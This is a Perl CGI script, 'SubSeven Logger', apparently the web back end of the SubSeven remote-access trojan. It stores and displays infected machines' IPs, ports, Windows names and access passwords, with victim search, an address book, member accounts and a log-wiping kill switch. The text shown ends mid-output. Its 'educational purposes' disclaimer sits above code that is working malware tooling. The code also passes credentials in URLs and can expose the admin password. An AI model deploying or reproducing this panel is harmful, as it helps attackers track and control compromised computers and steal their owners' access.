#! /usr/bin/perl

### ^ path to perl on your server (should be correct)
###   If your wrong, you will get a 500 error.

###################################################################
#                     +SUBSEVEN LOGGER+                           #
###################################################################
#                                                                 #
# SubSeven is provided 'as-is', without any express or implied    #
# warranty. in no event will the author be held liable for any    #
# damages arising from the use of it.                             #
#                                                                 #
# The author can't be held responsible for any illegal action(s)  #
# arising from the use of this software. Sub7 is provided for     #
# educational purposes only!                                      #
#                                                                 #
#                 SUBSEVEN CAN BE FOUND AT                        #
#                    www.sub7page.com                             #
#                                                                 #
###################################################################
# There is nothing in this file you need to edit, in fact you     #
# may cause harm just by changing a few letters.  If however      #
# the first line of this program is not the path to perl on       #
# your server, you need to change that.  But that is all, no      #
# more.  Please Read the README.txt that you receved with this    #
# file.  all questions will be reviewed there.                    #
#                                                                 #
# There is no way to modify this script so that it will retreave  #
# information that it already does not.                           #
###################################################################
#                                                                 #
#               - ABOUT CGI SUBSEVEN LOGGER -                     #
#                                                                 #
#   Programmer:   Black-Fire                                      #
#   Website:      http://www.black-fire.net                       #
#   ICQ:          64782400                                        #
#   E-mail        sublogger@black-fire.net                        #
#   IRC:          irc.chatech.net  #bfn                           #     
#                                                                 #
###################################################################
#                                                                 #
#  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  #
#  M""""""'YMMMMMP"""""YMMMMMMM"""""""`YMMMMP"""""YMMMM""""""""M  #
#  M  mmmm. `MMM' .mmm. `MMMMMM  mmmm.  MMM' .mmm. `MMMmmm  mmmM  #
#  M  MMMMM  MMM  MMMMM  MMMMMM  MMMMM  MMM  MMMMM  MMMMMM  MMMM  #
#  M  MMMMM  MMM  MMMMM  MMMMMM  MMMMM  MMM  MMMMM  MMMMMM  MMMM  #
#  M  MMMM' .MMM. `MMM' .MMMMMM  MMMMM  MMM. `MMM' .MMMMMM  MMMM  #
#  M_______.MMMMMb_____dMMMMMMM__MMMMM__MMMMb_____dMMMMMMM__MMMM  #
#  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMM""""""""`MMM""""""'YMMMM""MMM""""""""MMMMMMMMMMMMMM  #
#  MMMMMMMMMM  mmmmmmmMMM  mmmm. `MMM  MMMmmm  mmmMMMMMMMMMMMMMM  #
#  MMMMMMMMMM       MMMMM  MMMMM  MMM  MMMMMM  MMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMM  MMMMMMMMMM  MMMMM  MMM  MMMMMM  MMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMM  MMMMMMMMMM  MMMM' .MMM  MMMMMM  MMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMM________.MMM_______.MMMM__MMMMMM__MMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  #                                     
#                                                                 #
###################################################################

require "subseven.set";

print "Content-type: text/html\n\n";
########## Get enviroment vars #############>


$setabout = "false";
$script = $ENV{'SCRIPT_NAME'};

########## Set program vars ############
$kswitch = "true";  #### true if you want kill switch active, false if you want it disabled.
$error = "false";
$errortext = "";

########### View Settings #################
print "<html><title>$Xtitle</title>\n<body bgcolor = \"$Xbgcolor\" text = \"$Xtext\" link = \"$Xlinks\" alink = \"$Xlinks\" vlink = \"$Xlinks\">\n";
print "<font \"$Xfont\" size = \"$Xsize\">\n";


################# REMOVE AD BANNERS #######################
if ($Xads eq "true") {
}
else {
print "<script language = \"javascript\">\n/*\n<!--#echo banner=\"\"-->\n*/\n</script>\n";
}

########### Read Inputs and get Time ###############
read(STDIN, $bufferb, $ENV{'CONTENT_LENGTH'});
@pairsb = split(/&/, $bufferb);
foreach $pairb (@pairsb) {  ($nameb, $valueb) = split(/=/, $pairb);
  $valueb =~ tr/+/ /;
  $valueb =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $valueb =~ s/~!/ ~!/g;  $SUBIN{$nameb} = $valueb;}

@pairs = split(/&/, $ENV{'QUERY_STRING'});
foreach $pair (@pairs) {  ($name, $value) = split(/=/, $pair);
  $value =~ tr/+/ /;
  $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $value =~ s/~!/ ~!/g;  $SUBOUT{$name} = $value;}
	
	@days   = ('Sunday','Monday','Tuesday','Wednesday',
               'Thursday','Friday','Saturday');
($sec,$min,$hour,$mday,$mon,$year,$wday) = (localtime(time))[0,1,2,3,4,5,6];

$time = sprintf("%02d:%02d:%02d",$hour,$min,$sec);
$date = "$days[$wday] $mday, $time";
print "<div align = \"right\">Servers Time: $date</div><br>\n";

if ($Xsetup eq "not installed") {
print "<html><body bgcolor = \"black\" text = \"white\"><b>\n";
print "This program is not active until after you run setup.cgi , please do so now.\n";
print "</body></html>\n";
}
else {

$ra = $ENV{'REMOTE_ADDR'};
open(FILE, "subseven.ban");
@thisf = <FILE>;
close(FILE);
open(FILE, ">subseven.ban");
foreach $bannuser (@thisf) {
($Bip, $Bday, $Bcnt) = split(/\|/, $bannuser);
$bdaya = $Bday + 1;
if ($mday eq $Bday or $mday eq $bdaya) {
print FILE "$Bip|$Bday|$Bcnt|\n";
}
else {
if ($ra eq $Bip) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">BANN NOTICE</font></center></b></td><tr><td>\n";
print "<b><br><font \"$Xfont\" size = \"$Xsize\">You where removed from the bann list.  You will still be subject to access violation banns.</td></table>\n";
}
}
}
close(FILE);
open(FILE, "subseven.ban");
@thisf = <FILE>;
close(FILE);
$killaps = "no";
foreach $bannuser (@thisf) {
($Bip, $Bday, $Bcnt) = split(/\|/, $bannuser);
if ($ra eq $Bip and $Bcnt eq 10) {

$killaps = "yes";

}
}

if ($killswitch eq "ACTIVE" or $killaps eq "yes") {
if ($killswitch eq "ACTIVE") {
$errortext = "Script not functional.";
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">SERVER ERROR</font></center></b></td><tr><td>\n";
print "<b><br><font \"$Xfont\" size = \"$Xsize\">$errortext</td></table>\n";
}
else {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">BANN NOTICE</font></center></b></td><tr><td>\n";
print "<b><br><font \"$Xfont\" size = \"$Xsize\">Due to repeate access violations, your ip has been banned from this program.  you will be removed from the bann list after 24 hours.</td></table>\n";
}
}
else {
######### Locate and read operation code ############ 
$opper = $SUBOUT{'action'};
if ($opper eq "") {
$opper = $SUBIN{'action'};
}


######### Read settings ###########
if ($opper eq "") {
if ($Xauth eq "true") {

######### PRINT LOGIN HTML ############
print "<form method = \"post\" action = \"$script\">\n";
print "<input type = \"hidden\" name = \"action\" value = \"auth2\">\n";
print "<center><table border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><center><b><font \"$Xfont\" size = \"$Xsize\">Login Required</b></center></td><tr><td>\n";
print "<table border = 0 callpadding = 0 cellspacing = 0><td>\n";
print "<b><font \"$Xfont\" size = \"$Xsize\">UserName:</b></td><td><input type = \"text\" name = \"user\" size = 23></td><tr><td>\n";
print "<b><font \"$Xfont\" size = \"$Xsize\">PassWord:</b></td><td><input type = \"password\" name = \"pass\" size = 23></td><tr><td>\n";
print "</td><td><input type = \"submit\" value = \"Login\"></td></table>\n";
print "</form>\n";
}
else {
$opper = "view";
$Uauth = "true";
}
}

########## Validate User #############
if ($opper eq "auth2") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
if ($username eq "") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
}
open(FILE, "subseven.mem");
@members = <FILE>;
close(FILE);
$found = "false";
foreach $memberx (@members) {
($member, $passwd) = split(/\|/, $memberx);
if ($member eq $username and $passwd eq $password and $Xmulti eq "true") {
if ($member eq "" or $member eq " ") {
}
else {
$found = "yes";

}
}
}
if ($found eq "yes" or $Xauth eq "false") {
$opper = "view";
$Uauth = "true";
}
else {
if ($username eq $Xrequser and $password eq $Xreqpass) {
$opper = "view";
$Uauth = "true";
$admin = "true";
}
else {
$errortext = "You are not autherized to view the contents of this file!  Please contact the system administrator to request access.";
&derror;
&bforce;
}
}
}

########## Display List ##############
if ($opper eq "view") {
if ($Uauth eq "true" or $Xauth eq "false") {
if ($Xmessage eq "-") {
}
else {
$Xmessageb = $Xmessage;
$Xmessageb =~ s/\[url\]/http:\/\/$ENV{'SERVER_NAME'}$ENV{'SCRIPT_NAME'}/g;
$Xmessageb =~ s/\[key\]/$Xkey/g;
$Xmessageb =~ s/\[title\]/$Xtitle/g;
$Xmessageb =~ s/\[date\]/$date/g;
$userz = $SUBIN{'user'};
$passz = $SUBIN{'pass'};
if ($username eq "") {
$userz = $SUBOUT{'user'};
$passz = $SUBOUT{'pass'};
}
if ($username eq "" and $password eq "") {
$userz = "UNKNOWN";
$passz = "UNKNOWN";
}
$Xmessageb =~ s/\[user\]/$userz/g;
$Xmessageb =~ s/\[ip\]/$ENV{'REMOTE_ADDR'}/g;
$Xmessageb =~ s/\[htaccess\]/$ENV{'REMOTE_USER'}/g;
$Xmessageb =~ s/\[browser\]/$ENV{'HTTP_USER_AGENT'}/g;
$Xmessageb =~ s/\[referer\]/$ENV{'HTTP_REFEER'}/g;
$Xmessageb =~ s/\[password\]/$passz/g;
$Xmessageb =~ s/\[tableborders\]/$Xborders/g;
$Xmessageb =~ s/\[bgcolor\]/$Xbgcolor/g;
$Xmessageb =~ s/\[tbgcolor\]/$Xtables/g;
$Xmessageb =~ s/\[font\]/$Xfont/g;
$Xmessageb =~ s/\[admin\]/$Xrequser/g;
$Xmessageb =~ s/\[adminpass\]/$Xreqpass/g;
print "<p><center><table border = 0 cellpadding = 0 cellspacing = 0 width = 600><td><center>Administration Message</center><br><hr color = \"$Xborders\"></td><tr>\n";
print "<td valign = \"top\">$Xmessageb</td></table><p>\n";
}
$prg = "Bmcyq-epfj";
$prg =~ tr/mqnwbevrctxyzuaisopdlkfjgh/lkjhgfdsazxcvbnmpoiuytrewq/;
open(FILE, "subseven.log");
@file = <FILE>;
close(FILE);
@file = reverse(@file);
if ($admin eq "true") {
print "<center><table border = 0 cellpadding = 0 cellspacing = 5><td><div align = \"RIGHT\"><font \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=about&user=$username&pass=$password\">[About]</a> <a href = \"$script?action=search&user=$username&pass=$password\">[Search]</a> <a href = \"$script?action=addressbook&user=$username&pass=$password\">[Address Book]</a> <a href = \"$script?action=adminauth&user=$username&pass=$password\">[Admin Menu]</a></div></td><tr><td><table border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
}
else {
print "<center><table border = 0 cellpadding = 0 cellspacing = 5><td><div align = \"RIGHT\"><font \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=about\">[About]</a> <a href = \"$script?action=search&user=$username&pass=$password\">[Search]</a> <a href = \"$script?action=addressbook&user=$username&pass=$password\">[Address Book]</a> <a href = \"$script?action=admin\">[Admin Menu]</a></div></td><tr><td><table border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
}
print "<td><b><center><font face = \"areal\">CURRENT LIST</font></center></b></td><tr><td>\n";
print "<table border = 1 cellpadding = 3 cellspacing = 3 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><center><b><font \"$Xfont\" size = \"$Xsize\">Network</td><td><center><font \"$Xfont\" size = \"$Xsize\"><b>Windows Name</td><td><center><b><font \"$Xfont\" size = \"$Xsize\">Server</td><td><center><b><font \"$Xfont\" size = \"$Xsize\">IP</td><td><center><b><font \"$Xfont\" size = \"$Xsize\">Ports</td><td><center><b><font \"$Xfont\" size = \"$Xsize\">Time</td><td><center><b><font \"$Xfont\" size = \"$Xsize\">Pass</td><tr>\n";
print "<td><center>-</td><td><center>-</td><td><center>-</td><td><center>-</td><td><center>-</td><td><center>-</td><td><center>-</td>\n";
foreach $line (@file) {
($ip, $port, $date, $user, $dayz, $monz, $win, $tpass, $connection) = split(/\|/, $line);
$lenip = 0;
@ipsb = split(/\./, $ip);
foreach $setip (@ipsb) {
$lenip++;
}
if ($Xsconnection eq "true") {
$connection = "DISABLED";
}
if ($lenip >= 5 and $connection eq "") {
print "<tr><td><font \"$Xfont\" size = \"$Xsize\"><center>NETWORK</center>\n";
}
else {
if ($connection eq "") {
print "<tr><td><font \"$Xfont\" size = \"$Xsize\"><center>UNKNOWN</center>\n";
}
else {
print "<tr><td><font \"$Xfont\" size = \"$Xsize\"><center>$connection</center>\n";
}
}
if ($Xswin eq "true") {
$win = "DISABLED";
}
if ($Xsuser eq "true") {
$user = "DISABLED";
}
if ($Xsip eq "true") {
$ip = "DISABLED";
}
if ($Xsport eq "true") {
$port = "DISABLED";
}
if ($Xsdate eq "true") {
$date = "DISABLED";
}
if ($Xspass eq "true") {
$tpass = "DISABLED";
}
print "</td><td><font face = \"$Xfont\" size = \"$Xsize\">$win</td><td><font face = \"$Xfont\" size = \"$Xsize\">$user</td><td><font face = \"$Xfont\" size = \"$Xsize\">$ip</td><td><font face = \"$Xfont\" size = \"$Xsize\">$port</td><td><font face = \"$Xfont\" size = \"$Xsize\">$date</td><td><font face = \"$Xfont\" size = \"$Xsize\">$tpass</td>\n";
}
print "</table></td></table><div align = \"right\"><font size = 1 face = \"$Xfont\">programmer: $prg</font></div></td></table>\n";
}
else {
$errortext = "The system administrator has set this program to require user authentication.  Please go back to the login page and enter a valid username and password.";
&derror;
&bforce;
}
}


######### VIEW ADDRESS BOOK #############
if ($opper eq "addressbook") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
if ($username eq "") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
}
open(FILE, "subseven.mem");
@members = <FILE>;
close(FILE);
$found = "false";
$allow = "false";
foreach $memberx (@members) {
($member, $passwd) = split(/\|/, $memberx);
if ($member eq $username and $passwd eq $password and $Xmulti eq "true") {
if ($member eq "" or $member eq " ") {
}
else {
$found = "yes";

}
}
}
if ($found eq "yes") {
$allow = "true";
$Uauth = "true";
}
else {
if ($username eq $Xrequser and $password eq $Xreqpass) {
$allow = "true";
$admin = "true";
}
}
if ($allow eq "true" or $Xauth eq "false") {
$prg = "Bmcyq-epfj";
$prg =~ tr/mqnwbevrctxyzuaisopdlkfjgh/lkjhgfdsazxcvbnmpoiuytrewq/;
open(FILE, "subseven.adr");
@file = <FILE>;
close(FILE);
@file = reverse(@file);
if ($admin eq "true") {
print "<center><table border = 0 cellpadding = 0 cellspacing = 5><td><div align = \"RIGHT\"><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=about&user=$username&pass=$password\">[About]</a> <a href = \"$script?action=auth2&user=$username&pass=$password\">[Main Log]</a> <a href = \"$script?action=adminauth&user=$username&pass=$password\">[Admin Menu]</a></div></td><tr><td><table border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
}
else {
print "<center><table border = 0 cellpadding = 0 cellspacing = 5><td><div align = \"RIGHT\"><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=about\">[About]</a> <a href = \"$script?action=auth2&user=$username&pass=$password\">[Main Log]</a> <a href = \"$script?action=admin\">[Admin Menu]</a></div></td><tr><td><table border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
}
print "<td><b><center><font face = \"areal\">ADDESS BOOK</font></center></b></td><tr><td>\n";
print "<table border = 1 cellpadding = 3 cellspacing = 3 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\"><td>\n";
print "<center><font face = \"$Xfont\" size = \"$Xsize\"><b>Windows Name</td><td><center><b><font face = \"$Xfont\" size = \"$Xsize\">ID</td><td><center><b><font face = \"$Xfont\" size = \"$Xsize\">IP</td><td><center><b><font face = \"$Xfont\" size = \"$Xsize\">PORT</td><td><center><b><font face = \"$Xfont\" size = \"$Xsize\">PASS</td><td width = 230><center><b><font face = \"$Xfont\" size = \"$Xsize\">NOTES</center></td>\n";
print "<tr><td><center>-</td><td><center>-</td><td><center>-</td><td><center>-</td><td><center>-</td><td><center>-</td>\n";
foreach $line (@file) {
($ip, $port, $user, $win, $tpass, $notes) = split(/\|/, $line);
print "<tr><td><font face = \"$Xfont\" size = \"$Xsize\">$win</td><td><font face = \"$Xfont\" size = \"$Xsize\">$user</td><td><font face = \"$Xfont\" size = \"$Xsize\">$ip</td><td><font face = \"$Xfont\" size = \"$Xsize\">$port</td><td><font face = \"$Xfont\" size = \"$Xsize\">$tpass</td><td><font face = \"$Xfont\" size = \"$Xsize\">$notes</td>\n";
}
print "</table></td></table><div align = \"right\"><font size = 1 face = \"$Xfont\">programmer: $prg</font></div></td></table>\n";
}
else {
$errortext = "The system administrator has set this program to require user authentication.  Please go back to the login page and enter a valid username and password.";
&derror;
&bforce;
}
}


############ Admin login ##############
if ($opper eq "admin") {
print "<form method = \"post\" action = \"$script\">\n";
print "<input type = \"hidden\" name = \"action\" value = \"adminauth\">\n";
print "<center><table border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><center><b><font face = \"$Xfont\" size = \"$Xsize\">Admin Login</b></center></td><tr><td>\n";
print "<table border = 0 callpadding = 0 cellspacing = 0><td>\n";
print "<b><font face = \"$Xfont\" size = \"$Xsize\">UserName:</b></td><td><input type = \"text\" name = \"user\" size = 23></td><tr><td>\n";
print "<b><font face = \"$Xfont\" size = \"$Xsize\">PassWord:</b></td><td><input type = \"password\" name = \"pass\" size = 23></td><tr><td>\n";
print "</td><td><input type = \"submit\" value = \"Login\"></td></table>\n";
print "</form>\n";
}

############ admin verify ###############
if ($opper eq "adminauth") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
if ($username eq "" and $password eq "") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
}
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">ADMIN MENU</font></center></b></td><tr><td>\n";
print "<b><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=auth2&user=$username&pass=$password\">[ View List ]</a><br>\n";
print "<b><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=about&user=$username&pass=$password\">[ About/help ]</a><p>\n";
print "<b><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=diso&user=$username&pass=$password\">[ Disable options ]</a><br>\n";
print "<b><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=cl&user=$username&pass=$password\">[ Clear List ]</a><br>\n";
print "<b><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=s&user=$username&pass=$password\">[ Change Settings ]</a><br>\n";
print "<b><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=cp&user=$username&pass=$password\">[ Change Password ]</a><p>\n";
if ($Xmulti eq "true") {
print "<b><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=am&user=$username&pass=$password\">[ Add Member ]</a><br>\n";
print "<b><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=dm&user=$username&pass=$password\">[ Delete Member ]</a><p>\n";
}
print "<b><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=adr&user=$username&pass=$password\">[ Add Address ]</a><br>\n";
print "<b><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=radr&user=$username&pass=$password\">[ Remove Address ]</a><br>\n";
print "<b><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=mmessage&user=$username&pass=$password\">[ Member Message ]</a><br>\n";
print "<b><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=ks&user=$username&pass=$password\">[ Kill Switch ]</a><br></td></table>\n";
}
else {
$errortext = "You may not access this menu, without the valid admin username and password.";
&derror;
&bforce;
}
}

############## Kill Switch ###################
if ($opper eq "ks") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">KILL SWITCH</font></center></b></td><tr><td>\n";
print "<center><font face = \"$Xfont\" size = \"$Xsize\">The kill switch will disable this script.  You will not be able to use it again, untill you run the setup program after re-installing the script.  This option is offered only as a last resort, DO NOT USE IT UNLESS YOU MUST. once the script is disabled, it will no longer record new IP's, and will delete all existing ones.  <p>\n";
print "Are you sure you want to Kill this program?<br>\n";
print "<table border = 0 cellpadding = 0 cellspacing = 0><td><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=kill&user=$username&pass=$password\">[ YES ]</a></td><td width = 30></td><td><a href = \"$script?action=adminauth&user=$username&pass=$password\">[ NO ]</a></td></table></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

if ($opper eq "kill") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
if ($username eq $Xrequser and $password eq $Xreqpass) {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">SCRIPT DISABLED</font></center></b></td><tr><td>\n";
if ($kswitch eq "true") {
print "<font face = \"$Xfont\" size = \"$Xsize\">The kill switch has been activated.  The administration and member services will no longer function.  You must now re-install the program to use it again.\n";
open(FILE, ">>subseven.set");
print FILE "\n\$killswitch = \"ACTIVE\";\n";
close(FILE);
open(FILE, ">subseven.log");
close(FILE);
}
else {
print "The kill switch was not activated.  You must activate it in the setup program. DISABLED ON BETA VERSIONS.";
}
print "<center></b><p><a href = \"$script?action=adminauth&user=$username&pass=$password\"><font face = \"$Xfont\" size = \"$Xsize\">[ MENU ]</a></td></table>\n";
}
else {
$errortext = "You do not have access to preform this action.";
&derror;
&bforce;
}
}

####### SEARCH FOR IP STRING ##########
if ($opper eq "search") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
if ($username eq "") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
}
open(FILE, "subseven.mem");
@members = <FILE>;
close(FILE);
$found = "false";
$allow = "false";
foreach $memberx (@members) {
($member, $passwd) = split(/\|/, $memberx);
if ($member eq $username and $passwd eq $password and $Xmulti eq "true") {
if ($member eq "" or $member eq " ") {
}
else {
$found = "yes";

}
}
}
if ($found eq "yes") {
$allow = "true";
$Uauth = "true";
}
else {
if ($username eq $Xrequser and $password eq $Xreqpass) {
$allow = "true";
$admin = "true";
}
}
if ($allow eq "true" or $Xauth eq "false") {
print "<center><table width = 600 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
print "<td><b><center><font face = \"areal\">SEARCH OPTIONS</font></center></b></td><tr><td>\n";
print "<form action = \"$script\" method = \"post\"><input type = \"hidden\" name = \"action\" value = \"search2\"><input type = \"hidden\" name = \"user\" value = \"$username\"><input type = \"hidden\" name = \"pass\" value = \"$password\">\n";
print "<font face = \"$Xfont\" size = \"$Xsize\"><p>you can use wild cards (* = wild card) for information you do not know, or wish to exclude.  the serch will only requre the non wild card values to be true, so if all fields are wild cards, then all ip's will be displayed.<p>\n";
print "THE FIELDS ARE <b>CaSe SeNsItIvE</b>.</font><p>\n";
print "<table border = 0 cellpadding = 0 cellspacing = 0>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">IP String: </td><td><input type = \"text\" name = \"ip1\" value = \"*\" maxlength = 3 size = 3>.<input type = \"text\" name = \"ip2\" value = \"*\" maxlength = 3 size = 3>.<input type = \"text\" name = \"ip3\" value = \"*\" maxlength = 3 size = 3>.<input type = \"text\" name = \"ip4\" value = \"*\" maxlength = 3 size = 3></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">Connection: </td><td><input type = \"text\" name = \"connection\" value = \"*\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">PORT: </td><td><input type = \"text\" name = \"aport\" value = \"*\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">windows name: </td><td><input type = \"text\" name = \"awinname\" value = \"*\" size = 23></td><tr>\n";
print "<td><font face = \"$Xfont\" size = \"$Xsize\">ID (name): </td><td><input type = \"text\" name = \"nameid\" value = \"*\" size = 23></td><tr>\n";
print "<td></td><td><input type = \"submit\" value = \"Search\"></td></table></form></td></table>\n";
}
else {
$errortext = "The system administrator has set this program to require user authentication.  Please go back to the login page and enter a valid username and password.";
&derror;
&bforce;
}
}


if ($opper eq "search2") {
$username = $SUBIN{'user'};
$password = $SUBIN{'pass'};
if ($username eq "") {
$username = $SUBOUT{'user'};
$password = $SUBOUT{'pass'};
}
open(FILE, "subseven.mem");
@members = <FILE>;
close(FILE);
$found = "false";
$allow = "false";
foreach $memberx (@members) {
($member, $passwd) = split(/\|/, $memberx);
if ($member eq $username and $passwd eq $password and $Xmulti eq "true") {
if ($member eq "" or $member eq " ") {
}
else {
$found = "yes";

}
}
}
if ($found eq "yes") {
$allow = "true";
$Uauth = "true";
}
else {
if ($username eq $Xrequser and $password eq $Xreqpass) {
$allow = "true";
$admin = "true";
}
}
if ($allow eq "true" or $Xauth eq "false") {
$ip1 = $SUBIN{'ip1'};
$ip2 = $SUBIN{'ip2'};
$ip3 = $SUBIN{'ip3'};
$ip4 = $SUBIN{'ip4'};
$winX = $SUBIN{'awinname'};
$portX = $SUBIN{'aport'};
$connectionX = $SUBIN{'connection'};
$idX = $SUBIN{'aid'};

if ($Xmessage eq "-") {
}
else {
$Xmessageb = $Xmessage;
$Xmessageb =~ s/\[url\]/http:\/\/$ENV{'SERVER_NAME'}$ENV{'SCRIPT_NAME'}/g;
$Xmessageb =~ s/\[key\]/$Xkey/g;
$Xmessageb =~ s/\[title\]/$Xtitle/g;
$Xmessageb =~ s/\[date\]/$date/g;
$userz = $SUBIN{'user'};
$passz = $SUBIN{'pass'};
if ($username eq "") {
$userz = $SUBOUT{'user'};
$passz = $SUBOUT{'pass'};
}
if ($username eq "" and $password eq "") {
$userz = "UNKNOWN";
$passz = "UNKNOWN";
}
$Xmessageb =~ s/\[user\]/$userz/g;
$Xmessageb =~ s/\[ip\]/$ENV{'REMOTE_ADDR'}/g;
$Xmessageb =~ s/\[htaccess\]/$ENV{'REMOTE_USER'}/g;
$Xmessageb =~ s/\[browser\]/$ENV{'HTTP_USER_AGENT'}/g;
$Xmessageb =~ s/\[referer\]/$ENV{'HTTP_REFEER'}/g;
$Xmessageb =~ s/\[password\]/$passz/g;
$Xmessageb =~ s/\[tableborders\]/$Xborders/g;
$Xmessageb =~ s/\[bgcolor\]/$Xbgcolor/g;
$Xmessageb =~ s/\[tbgcolor\]/$Xtables/g;
$Xmessageb =~ s/\[font\]/$Xfont/g;
$Xmessageb =~ s/\[admin\]/$Xrequser/g;
$Xmessageb =~ s/\[adminpass\]/$Xreqpass/g;
print "<p><center><table border = 0 cellpadding = 0 cellspacing = 0 width = 600><td><center>Administration Message</center><br><hr color = \"$Xborders\"></td><tr>\n";
print "<td valign = \"top\">$Xmessageb</td></table><p>\n";
}
$prg = "Bmcyq-epfj";
$prg =~ tr/mqnwbevrctxyzuaisopdlkfjgh/lkjhgfdsazxcvbnmpoiuytrewq/;
open(FILE, "subseven.log");
@file = <FILE>;
close(FILE);
@file = reverse(@file);
if ($admin eq "true") {
print "<center><table border = 0 cellpadding = 0 cellspacing = 5><td><div align = \"RIGHT\"><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=about&user=$username&pass=$password\">[About]</a> <a href = \"$script?action=search&user=$username&pass=$password\">[Search]</a> <a href = \"$script?action=auth2&user=$username&pass=$password\">[Main Log]</a> <a href = \"$script?action=adminauth&user=$username&pass=$password\">[Admin Menu]</a></div></td><tr><td><table border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
}
else {
print "<center><table border = 0 cellpadding = 0 cellspacing = 5><td><div align = \"RIGHT\"><font face = \"$Xfont\" size = \"$Xsize\"><a href = \"$script?action=about\">[About]</a> <a href = \"$script?action=search&user=$username&pass=$password\">[Search]</a> <a href = \"$script?action=auth2&user=$username&pass=$password\">[Main Log]</a> <a href = \"$script?action=admin\">[Admin Menu]</a></div></td><tr><td><table border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
}
print "<td><b><center><font face = \"areal\">VIEW SEARCH LOG</font></center></b></td><tr><td>\n";
print "<table border = 1 cellpadding = 3 cellspacing = 3 bgcolor = \"$Xtables\" bordercolor = \"$Xborders\">\n";
